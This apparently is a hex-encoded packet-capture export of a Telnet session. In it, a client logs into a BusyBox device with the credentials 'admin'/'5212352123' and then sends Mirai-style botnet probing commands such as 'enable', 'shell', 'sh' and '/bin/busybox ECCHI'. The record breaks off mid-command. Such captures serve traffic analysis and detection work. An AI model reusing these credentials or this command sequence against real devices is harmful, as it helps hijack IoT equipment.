frame.number,frame.time,ip.src,ip.dst,tcp.seq,tcp.payload
"1","Mar  4, 2022 16:28:09.864989000 PST","192.168.0.12","192.168.0.243","1","fffd01fffd1ffffd21fffb01fffb03"
"2","Mar  4, 2022 16:28:09.864989000 PST","192.168.0.12","192.168.0.243","1","fffd01fffd1ffffd21fffb01fffb03"
"3","Mar  4, 2022 16:28:09.865618000 PST","192.168.0.12","192.168.0.243","16","0d0d0a0d0a0d0a42757379426f782076312e31322e312028323031382d30372d30332031313a31323a31302043535429206275696c742d696e207368656c6c2028617368290d0a456e746572202768656c702720666f722061206c697374206f66206275696c742d696e20636f6d6d616e64732e0d0a0d0a2320"
"4","Mar  4, 2022 16:28:09.865618000 PST","192.168.0.12","192.168.0.243","16","0d0d0a0d0a0d0a42757379426f782076312e31322e312028323031382d30372d30332031313a31323a31302043535429206275696c742d696e207368656c6c2028617368290d0a456e746572202768656c702720666f722061206c697374206f66206275696c742d696e20636f6d6d616e64732e0d0a0d0a2320"
"5","Mar  4, 2022 16:28:09.870795000 PST","192.168.0.243","192.168.0.12","1","fffc01"
"6","Mar  4, 2022 16:28:09.870796000 PST","192.168.0.243","192.168.0.12","1","fffc01"
"7","Mar  4, 2022 16:28:09.871336000 PST","192.168.0.243","192.168.0.12","4","fffb1ffffa1f00500018fff0fffc21fffd01fffd03"
"8","Mar  4, 2022 16:28:09.871336000 PST","192.168.0.243","192.168.0.12","4","fffb1ffffa1f00500018fff0fffc21fffd01fffd03"
"9","Mar  4, 2022 16:28:09.872411000 PST","192.168.0.243","192.168.0.12","25","61646d696e"
"10","Mar  4, 2022 16:28:09.872411000 PST","192.168.0.243","192.168.0.12","25","61646d696e"
"11","Mar  4, 2022 16:28:09.872411000 PST","192.168.0.12","192.168.0.243","138","0d23201b5b4a"
"12","Mar  4, 2022 16:28:09.872411000 PST","192.168.0.12","192.168.0.243","138","0d23201b5b4a"
"13","Mar  4, 2022 16:28:09.873730000 PST","192.168.0.12","192.168.0.243","144","61"
"14","Mar  4, 2022 16:28:09.873730000 PST","192.168.0.12","192.168.0.243","144","61"
"15","Mar  4, 2022 16:28:09.873975000 PST","192.168.0.243","192.168.0.12","30","35323132333532313233"
"16","Mar  4, 2022 16:28:09.873975000 PST","192.168.0.243","192.168.0.12","30","35323132333532313233"
"17","Mar  4, 2022 16:28:09.874249000 PST","192.168.0.12","192.168.0.243","145","64"
"18","Mar  4, 2022 16:28:09.874249000 PST","192.168.0.12","192.168.0.243","145","64"
"19","Mar  4, 2022 16:28:09.879588000 PST","192.168.0.12","192.168.0.243","146","6d"
"20","Mar  4, 2022 16:28:09.879588000 PST","192.168.0.12","192.168.0.243","146","6d"
"21","Mar  4, 2022 16:28:09.880491000 PST","192.168.0.12","192.168.0.243","147","69"
"22","Mar  4, 2022 16:28:09.880491000 PST","192.168.0.12","192.168.0.243","147","69"
"23","Mar  4, 2022 16:28:09.881201000 PST","192.168.0.12","192.168.0.243","148","6e"
"24","Mar  4, 2022 16:28:09.881201000 PST","192.168.0.12","192.168.0.243","148","6e"
"25","Mar  4, 2022 16:28:09.881859000 PST","192.168.0.12","192.168.0.243","149","35"
"26","Mar  4, 2022 16:28:09.881860000 PST","192.168.0.12","192.168.0.243","149","35"
"27","Mar  4, 2022 16:28:09.882650000 PST","192.168.0.12","192.168.0.243","150","32"
"28","Mar  4, 2022 16:28:09.882650000 PST","192.168.0.12","192.168.0.243","150","32"
"29","Mar  4, 2022 16:28:09.883225000 PST","192.168.0.12","192.168.0.243","151","3132"
"30","Mar  4, 2022 16:28:09.883225000 PST","192.168.0.12","192.168.0.243","151","3132"
"31","Mar  4, 2022 16:28:09.884150000 PST","192.168.0.12","192.168.0.243","153","33"
"32","Mar  4, 2022 16:28:09.884150000 PST","192.168.0.12","192.168.0.243","153","33"
"33","Mar  4, 2022 16:28:09.884890000 PST","192.168.0.12","192.168.0.243","154","353231"
"34","Mar  4, 2022 16:28:09.884890000 PST","192.168.0.12","192.168.0.243","154","353231"
"35","Mar  4, 2022 16:28:09.885694000 PST","192.168.0.12","192.168.0.243","157","32"
"36","Mar  4, 2022 16:28:09.885694000 PST","192.168.0.12","192.168.0.243","157","32"
"37","Mar  4, 2022 16:28:09.886352000 PST","192.168.0.12","192.168.0.243","158","33"
"38","Mar  4, 2022 16:28:09.886352000 PST","192.168.0.12","192.168.0.243","158","33"
"39","Mar  4, 2022 16:28:11.873167000 PST","192.168.0.243","192.168.0.12","40","0d0a"
"40","Mar  4, 2022 16:28:11.873168000 PST","192.168.0.243","192.168.0.12","40","0d0a"
"41","Mar  4, 2022 16:28:11.875428000 PST","192.168.0.12","192.168.0.243","159","0d0a2f62696e2f73683a2061646d696e353231323335323132333a206e6f7420666f756e640d0a2320"
"42","Mar  4, 2022 16:28:11.875428000 PST","192.168.0.12","192.168.0.243","159","0d0a2f62696e2f73683a2061646d696e353231323335323132333a206e6f7420666f756e640d0a2320"
"43","Mar  4, 2022 16:28:11.876375000 PST","192.168.0.243","192.168.0.12","42","656e61626c650d0a"
"44","Mar  4, 2022 16:28:11.876375000 PST","192.168.0.243","192.168.0.12","42","656e61626c650d0a"
"45","Mar  4, 2022 16:28:11.876663000 PST","192.168.0.243","192.168.0.12","50","7368656c6c0d0a73680d0a"
"46","Mar  4, 2022 16:28:11.876663000 PST","192.168.0.243","192.168.0.12","50","7368656c6c0d0a73680d0a"
"47","Mar  4, 2022 16:28:11.890217000 PST","192.168.0.12","192.168.0.243","200","656e61626c650d0a2f62696e2f73683a20656e61626c653a206e6f7420666f756e640d0a23207368656c6c0d0a2f62696e2f73683a207368656c6c3a206e6f7420666f756e640d0a232073680d0a0d0a0d0a42757379426f782076312e31322e312028323031382d30372d30332031313a31323a31302043535429206275696c742d696e207368656c6c2028617368290d0a456e746572202768656c702720666f722061206c697374206f66206275696c742d696e20636f6d6d616e64732e0d0a0d0a2320"
"48","Mar  4, 2022 16:28:11.890460000 PST","192.168.0.12","192.168.0.243","200","656e61626c650d0a2f62696e2f73683a20656e61626c653a206e6f7420666f756e640d0a23207368656c6c0d0a2f62696e2f73683a207368656c6c3a206e6f7420666f756e640d0a232073680d0a0d0a0d0a42757379426f782076312e31322e312028323031382d30372d30332031313a31323a31302043535429206275696c742d696e207368656c6c2028617368290d0a456e746572202768656c702720666f722061206c697374206f66206275696c742d696e20636f6d6d616e64732e0d0a0d0a2320"
"49","Mar  4, 2022 16:28:11.892609000 PST","192.168.0.243","192.168.0.12","61","2f62696e2f62757379626f782045434348490d0a"
"50","Mar  4, 2022 16:28:11.892609000 PST","192.168.0.243","192.168.0.12","61","2f62696e2f62757379626f782045434348490d0a"
"51","Mar  4, 2022 16:28:11.897383000 PST","192.168.0.12","192.168.0.243","397","2f62696e2f62757379626f782045434348490d0a"
"52","Mar  4, 2022 16:28:11.897383000 PST","192.168.0.12","192.168.0.243","397","2f62696e2f62757379626f782045434348490d0a"
"53","Mar  4, 2022 16:28:11.903773000 PST","192.168.0.12","192.168.0.243","417","4543434849"
"54","Mar  4, 2022 16:28:11.903773000 PST","192.168.0.12","192.168.0.243","417","4543434849"
"55","Mar  4, 2022 16:28:11.904424000 PST","192.168.0.12","192.168.0.243","422","3a206170706c6574206e6f7420666f756e640d0a"
"56","Mar  4, 2022 16:28:11.904424000 PST","192.168.0.12","192.168.0.243","422","3a206170706c6574206e6f7420666f756e640d0a"
"57","Mar  4, 2022 16:28:11.905206000 PST","192.168.0.243","192.168.0.12","81","2f62696e2f62757379626f782070733b202f62696e2f62757379626f782045434348490d0a"
"58","Mar  4, 2022 16:28:11.905206000 PST","192.168.0.243","192.168.0.12","81","2f62696e2f62757379626f782070733b202f62696e2f62757379626f782045434348490d0a"
"59","Mar  4, 2022 16:28:11.906167000 PST","192.168.0.12","192.168.0.243","442","2f62696e2f62757379626f782070733b202f62696e2f62757379626f782045434348490d0a"
"60","Mar  4, 2022 16:28:11.906167000 PST","192.168.0.12","192.168.0.243","442","2f62696e2f62757379626f782070733b202f62696e2f62757379626f782045434348490d0a"
"61","Mar  4, 2022 16:28:11.907555000 PST","192.168.0.12","192.168.0.243","479","2320"
"62","Mar  4, 2022 16:28:11.907556000 PST","192.168.0.12","192.168.0.243","479","2320"
"63","Mar  4, 2022 16:28:11.908099000 PST","192.168.0.12","192.168.0.243","481","2f"
"64","Mar  4, 2022 16:28:11.908099000 PST","192.168.0.12","192.168.0.243","481","2f"
"65","Mar  4, 2022 16:28:11.908792000 PST","192.168.0.12","192.168.0.243","482","62"
